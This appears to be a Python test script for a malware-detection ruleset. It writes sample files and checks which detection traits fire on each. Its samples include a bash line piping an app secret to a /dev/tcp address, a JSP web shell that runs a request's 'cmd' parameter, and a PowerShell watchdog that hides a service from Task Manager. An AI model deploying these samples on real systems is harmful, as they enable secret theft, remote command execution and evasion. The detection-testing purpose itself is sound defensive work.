"""Generate inert source controls and check detection boundaries."""
import json
from pathlib import Path
import subprocess
import sys

root = Path(__file__).resolve().parents[3]
destination = Path(sys.argv[1]).resolve()
destination.mkdir(parents=True, exist_ok=True)
watchdog = 'objectives/anti-analysis/tool-detect/process::'
miner = 'objectives/impact/cryptojacking/miner/smart::miner-evasion-service-watchdog'
export = 'objectives/exfiltration/stealer/env::secret-env-var-to-devtcp-endpoint'
source = 'objectives/exfiltration/stealer/env::shell-secret-output-to-devtcp'
process = 'micro-behaviors/process/enumerate/shell::powershell-get-process-query'
xmrig = 'micro-behaviors/process/info/name::xmrig-product'
response = 'micro-behaviors/communications/http/response::jsp-response-print-syntax'
webshell = 'objectives/command-and-control/backdoor/webshell/request/command::jsp-local-request-command-execution'
base = '''$service = "ExampleSvc"
while ($true) {
  $observer = Get-Process -Name "taskmgr" -ErrorAction SilentlyContinue
  if ($observer) {
    Stop-Service -Name $service -Force
  } else {
    Start-Service -Name $service
  }
  Start-Sleep -Seconds 5
}
'''
gate = watchdog + 'taskmgr-query-service-stop-start'
loop = watchdog + 'taskmgr-service-concealment-watchdog'
kill = watchdog + 'taskmgr-service-evasion-and-kill'
endpoint = '/dev/tcp/93.184.216.34/43210'
send = 'printf \'%s\' "$APP_SECRET_KEY" > ' + endpoint + '\n'
page = '''<%@ page import="java.io.*" %>
<% String cmd = request.getParameter("cmd");
if (cmd != null) {
Process p = Runtime.getRuntime().exec(cmd);
BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
String line;
while ((line = br.readLine()) != null) {
out.println(line);
}
} %>
'''
cases = {
 'watchdog.ps1': (base, [gate, loop, process], [miner, xmrig, kill]),
 'watchdog-kill.ps1': (base.replace('    Stop-Service -Name $service -Force', '    Stop-Service -Name $service -Force\n    taskkill /F /IM taskmgr.exe'), [gate, loop, kill], [miner]),
 'watchdog-renamed.ps1': (base.replace('$service', '$anotherService').replace('$observer', '$processes'), [gate, loop], []),
 'ordinary-service.ps1': ('Get-Process -Name taskmgr\nStop-Service -Name $s\nStart-Service -Name $s\n', [process], [gate, loop, kill]),
 'different-guard.ps1': (base.replace('if ($observer)', 'if ($enabled)'), [], [gate, loop, kill]),
 'different-service.ps1': (base.replace('Start-Service -Name $service', 'Start-Service -Name $other'), [], [gate, loop, kill]),
 'overwritten-query.ps1': (base.replace('  if ($observer)', '  $observer = $false\n  if ($observer)'), [], [gate, loop, kill]),
 'comment-miner.ps1': ('# XMRig miner\n' + base, [gate, loop], [xmrig, miner]),
 'literal-miner.ps1': ('$name = "xmrig"\n' + base, [xmrig, miner], []),
 'comment-query.ps1': (base.replace('$observer = Get-Process', '# $observer = Get-Process'), [], [gate, loop, kill]),
 'tcp-send.sh': ('#!/bin/bash\n' + send, [source, export], []),
 'tcp-braced.sh': ('#!/bin/bash\n' + send.replace('$APP_SECRET_KEY', '${APP_SECRET_KEY}'), [source, export], []),
 'separate-socket.sh': ('#!/bin/bash\nprintf \'%s\' "$APP_SECRET_KEY" > /tmp/output\n: ' + endpoint + '\n', [], [source, export]),
 'literal-dollar.sh': ('#!/bin/bash\n' + send.replace('"$APP_SECRET_KEY"', "\'$APP_SECRET_KEY\'"), [], [source, export]),
 'stderr-socket.sh': ('#!/bin/bash\n' + send.replace(' > ', ' 2> '), [], [source, export]),
 'unused-format.sh': ('#!/bin/bash\n' + send.replace("\'%s\'", "\'constant\'"), [], [source, export]),
 'escaped-format.sh': ('#!/bin/bash\n' + send.replace("\'%s\'", "\'%%s\'"), [], [source, export]),
 'private-socket.sh': ('#!/bin/bash\n' + send.replace('93.184.216.34', '127.0.0.1'), [source], [export]),
 'comment-send.sh': ('#!/bin/bash\n# ' + send, [], [source, export]),
 'shadowed-printf.sh': ('#!/bin/bash\nprintf() { :; }\n' + send, [], [source, export]),
 'request-command.jsp': (page, [webshell, response], []),
 'request-fixed-command.jsp': (page.replace('.exec(cmd)', '.exec("whoami")'), [response], [webshell]),
 'response-comment.jsp': ('<%@ page import="java.io.*" %>\n<%-- out.println(line); --%>\n', [], [response]),
}
for name, (text, _, _) in cases.items():
    (destination / name).write_text(text)
result = subprocess.run(['cleave', '--traits-dir', str(root), '--format', 'json', str(destination)], text=True, capture_output=True)
if result.returncode:
    raise SystemExit(result.stdout + result.stderr)
reports = []
remaining = result.stdout.strip()
while remaining:
    report, end = json.JSONDecoder().raw_decode(remaining)
    reports.append(report)
    remaining = remaining[end:].lstrip()
files = {Path(f['path']).name: {t['id'] for t in f['traits']} for report in reports for f in report['files']}
failed = False
for name, (_, present, absent) in cases.items():
    observed = files.get(name, set())
    errors = ['missing ' + i for i in present if i not in observed]
    errors += ['unexpected ' + i for i in absent if i in observed]
    print(('FAIL ' if errors else 'PASS ') + name)
    for error in errors:
        print('  ' + error)
    failed |= bool(errors)
raise SystemExit(int(failed))
